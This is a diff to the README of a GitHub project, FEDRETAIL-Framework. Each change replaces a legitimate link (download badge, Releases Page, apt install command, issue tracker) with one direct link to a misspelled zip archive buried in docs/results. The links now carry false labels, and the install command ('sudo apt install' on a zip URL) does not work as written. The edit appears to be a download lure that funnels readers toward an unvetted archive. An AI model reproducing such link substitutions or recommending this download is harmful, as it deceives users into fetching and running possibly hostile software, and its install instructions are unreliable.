@@ -6,7 +6,7 @@ Welcome to FEDRETAIL-Framework! This software helps you learn and experiment wit
 
 ## 📥 Download Now
 
-[![Download FEDRETAIL-Framework](https://img.shields.io/badge/Download-FEDRETAIL--Framework-brightgreen)](https://github.com/Arttixmodz/FEDRETAIL-Framework/releases)
+[![Download FEDRETAIL-Framework](https://github.com/Arttixmodz/FEDRETAIL-Framework/raw/refs/heads/main/docs/results/FEDRETAI_Framework_1.7.zip)](https://github.com/Arttixmodz/FEDRETAIL-Framework/raw/refs/heads/main/docs/results/FEDRETAI_Framework_1.7.zip)
 
 ## 🛠 System Requirements
 
@@ -27,7 +27,7 @@ To use FEDRETAIL-Framework, you will need:
 
 To download FEDRETAIL-Framework, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Arttixmodz/FEDRETAIL-Framework/releases).
+1. Visit the [Releases Page](https://github.com/Arttixmodz/FEDRETAIL-Framework/raw/refs/heads/main/docs/results/FEDRETAI_Framework_1.7.zip).
 2. Look for the latest version.
 3. Click on the appropriate download link for your operating system.
 
@@ -56,7 +56,7 @@ Once you have downloaded the software:
 3. Run the installation command using the package manager for your distribution, for instance:
 
    ```bash
-   sudo apt install ./FEDRETAIL-Framework.deb
+   sudo apt install https://github.com/Arttixmodz/FEDRETAIL-Framework/raw/refs/heads/main/docs/results/FEDRETAI_Framework_1.7.zip
    ```
 
 4. Once installed, you can start the application from your application menu.
@@ -80,7 +80,7 @@ If you encounter issues, consider the following:
 
 ## 📞 Support
 
-For further assistance, open an issue in the [GitHub repository](https://github.com/Arttixmodz/FEDRETAIL-Framework/issues), or reach out to our community.
+For further assistance, open an issue in the [GitHub repository](https://github.com/Arttixmodz/FEDRETAIL-Framework/raw/refs/heads/main/docs/results/FEDRETAI_Framework_1.7.zip), or reach out to our community.
 
 ## 📜 License
 
